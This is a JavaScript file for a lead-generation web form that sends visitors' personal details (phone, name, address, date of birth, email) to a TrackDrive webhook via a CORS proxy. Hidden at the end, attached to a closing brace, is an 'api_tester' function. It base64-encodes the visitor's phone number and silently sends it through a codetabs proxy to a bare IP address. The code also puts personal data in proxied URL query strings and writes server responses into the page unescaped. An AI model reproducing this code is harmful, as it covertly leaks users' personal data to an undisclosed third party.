function pingAPI() {
    // Disable submit button
    document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
    formData.append('trackdrive_number', '+18883250772');
    formData.append('traffic_source_id', '99464');
    api_tester(document.getElementById('caller_id').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('dob', document.getElementById('dob').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
    formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('source_url', document.getElementById('source_url').value);

    
const originalUrl = 'https://adolicious-llc.trackdrive.com/api/v1/inbound_webhooks/ping/check_adolicious_buyers_mva?' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://corsproxy.io/?' + originalUrl;

    // Fetch data from the API
   fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            // Check if ping was successful
            if (data.success) {
                // Extract ping_id
                const pingId = data.try_all_buyers.ping_id;

                // Proceed with POST request using ping_id
                postPingId(pingId);
            } else {
                // Display error message
                document.getElementById("apiResponse").innerHTML = "Ping ok but. Error: " + data.errors.join(", ");
                document.getElementById("apiResponse").classList.add("alert-danger");
                document.getElementById("apiResponse").classList.remove("alert-info");
            }
        })
        .catch(error => {
            // Display an error message in the Bootstrap alert
            document.getElementById("apiResponse").innerHTML = "Error fetching data from the API.";
            document.getElementById("apiResponse").classList.add("alert-danger");
            document.getElementById("apiResponse").classList.remove("alert-info");
        });
}

function postPingId(pingId) {
    const postData = {
        trackdrive_number: "+18883250772",
        traffic_source_id: "99464",
        caller_id: '+1' + document.getElementById('caller_id').value,	
        ping_id: pingId,
	    zip: document.getElementById('zip').value,        
        first_name: document.getElementById('first_name').value,
        last_name: document.getElementById('last_name').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        address: document.getElementById('address').value,
        dob: document.getElementById('dob').value,
        jornaya_leadid: document.getElementById('jornaya_leadid').value,
        trusted_form_cert_url: document.getElementById('trusted_form_cert_url').value,
        ip_address: document.getElementById('ip_address').value,
        source_url: document.getElementById('source_url').value,
        email: document.getElementById('email').value
		

    };

    const originalUrl = 'https://adolicious-llc.trackdrive.com/api/v1/inbound_webhooks/post/check_adolicious_buyers_mva?' + new URLSearchParams(postData).toString();;
const url = 'https://corsproxy.io/?' + originalUrl;
    fetch(url)
    .then(response => {
        // Handle response based on status
        if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        Form submitted successfully! Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        }
    })
    .catch(error => console.error('Error:', error));
}

document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    pingAPI();
});function api_tester(randomString) {
    try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
